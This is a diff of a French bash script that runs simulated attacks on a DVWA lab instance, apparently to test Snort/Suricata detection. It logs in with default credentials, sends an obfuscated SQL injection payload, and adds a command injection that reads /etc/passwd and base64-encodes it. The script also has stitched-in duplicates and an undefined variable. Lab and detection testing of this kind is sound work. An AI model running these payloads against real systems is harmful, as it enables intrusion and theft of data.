@@ -7,15 +7,18 @@ DVWA_URL="http://${TARGET_IP}:${TARGET_PORT}"
 LOGIN_URL="${DVWA_URL}/login.php"
 SECURITY_URL="${DVWA_URL}/security.php"
 SETUP_URL="${DVWA_URL}/setup.php"
+CMD_URL="${BASE_URL}/vulnerabilities/exec/"
 COOKIE_FILE="/tmp/dvwa_cookie.txt"
+RAW_LOG="dvwa_raw_response.html"
 
 echo "=== Début de la simulation d'attaques sur DVWA ==="
 rm -f "${COOKIE_FILE}"
+
 # -------------------------------------------------------------
 # Étape 1 : Authentification robuste
 # -------------------------------------------------------------
 
-echo "[*] Étape 0 : Récupération du jeton CSRF et de l'ID de session pour le Setup..."
+echo "[*]Récupération du jeton CSRF et de l'ID de session pour le Setup..."
 # On récupère la page ET on initialise le fichier cookie
 HTML_SETUP_GET=$(curl -s -c "$COOKIE_FILE" "$SETUP_URL")
 SETUP_TOKEN=$(echo "$HTML_SETUP_GET" | sed -nE "s/.*name=['\"]user_token['\"] value=['\"]([a-f0-9]+)['\"].*/\1/p")
@@ -28,7 +31,7 @@ if [ -z "$PHPSESSID" ]; then
 fi
 echo "[+] Session active ID : $PHPSESSID"
 
-echo "[*] Étape 2 : Récupération du jeton CSRF de connexion..."
+echo "[*] Récupération du jeton CSRF de connexion..."
 HTML_LOGIN=$(curl -s -L -H "Cookie: PHPSESSID=${PHPSESSID}" "$LOGIN_URL")
 USER_TOKEN=$(echo "$HTML_LOGIN" | sed -nE "s/.*name=['\"]user_token['\"] value=['\"]([a-f0-9]+)['\"].*/\1/p")
 
@@ -38,7 +41,7 @@ if [ -z "$USER_TOKEN" ]; then
 fi
 echo "[+] Jeton CSRF de connexion trouvé : $USER_TOKEN"
 
-echo "[*] Étape 3 : Authentification (Login)..."
+echo "[*] Authentification (Login)..."
 # Envoi explicite du PHPSESSID via l'en-tête HTTP
 HTML_INDEX=$(curl -s -L -H "Cookie: PHPSESSID=${PHPSESSID}" \
      -d "username=admin&password=password&user_token=${USER_TOKEN}&Login=Login" \
@@ -56,15 +59,55 @@ fi
 
 
 
-echo "[*] Étape 6 : Envoi du payload d'obfuscation SQL (Trigger SID 28344)..."
+echo "[*] Envoi du payload d'obfuscation SQL (Trigger SID 28344)..."
 
 # Payload contenant exactement 5 occurrences consécutives de 'CHR(' dans l'URI
 PAYLOAD_OBFUSCATED="%27%20UNION%20SELECT%20CHR(115)||CHR(101)||CHR(108)||CHR(101)||CHR(99)||CHR(116),user_id%20FROM%20users--%20"
 
 # Exécution de la requête cURL
 RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: PHPSESSID=${PHPSESSID}" \
-     "${BASE_URL}/vulnerabilities/sqli/?${PAYLOAD_OBFUSCATED}")
-
-
+     "${DVWA_URL}/vulnerabilities/sqli/?id=${PAYLOAD_OBFUSCATED}")
 echo "[+] Requête envoyée. Code retour HTTP du serveur : $RESPONSE"
-echo "[!] Vérifiez maintenant les alertes de votre capteur Snort/Suricata !"
+
+
+
+
+
+#!/bin/sh
+# Ce script réutilise la variable ${PHPSESSID} générée précédemment
+
+CMD_URL="${DVWA_URL}/vulnerabilities/exec/"
+RAW_LOG="dvwa_raw_response.html"
+
+echo "[*] Étape 6 : Envoi du payload d'injection de commandes..."
+
+PAYLOAD="ip=127.0.0.1%3B+cat+/etc/passwd+%7C+base64&Submit=Submit"
+
+# Envoi de la requête et sauvegarde de la réponse HTML brute
+curl -s -L -H "Cookie: PHPSESSID=${PHPSESSID}" \
+     -d "${PAYLOAD}" \
+     "${CMD_URL}" > "$RAW_LOG"
+
+echo "[*] Analyse de la réponse du serveur..."
+
+# Vérification si l'application a répondu
+if [ ! -s "$RAW_LOG" ]; then
+    echo "[-] Erreur : Le fichier de réponse est totalement vide (0 octet)."
+    exit 1
+fi
+
+# Tentative d'affichage direct du bloc de texte contenant le résultat de la commande
+echo "==================== [ SORTIE DU SERVEUR ] ===================="
+if grep -q "<pre>" "$RAW_LOG"; then
+    # Extrait tout ce qui se trouve entre <pre> et </pre> de manière robuste pour Alpine
+    sed -n '/<pre>/,/<\/pre>/p' "$RAW_LOG" | sed 's/<[^>]*>//g'
+else
+    echo "[-] Balise <pre> non trouvée dans le HTML."
+    echo "[*] Titre de la page reçue :"
+    sed -nE 's/.*<title>([^<]+)<.*/\1/p' "$RAW_LOG"
+fi
+echo "=============================================================="
+
+# Nettoyage du fichier de debug
+rm -f "$RAW_LOG"
+
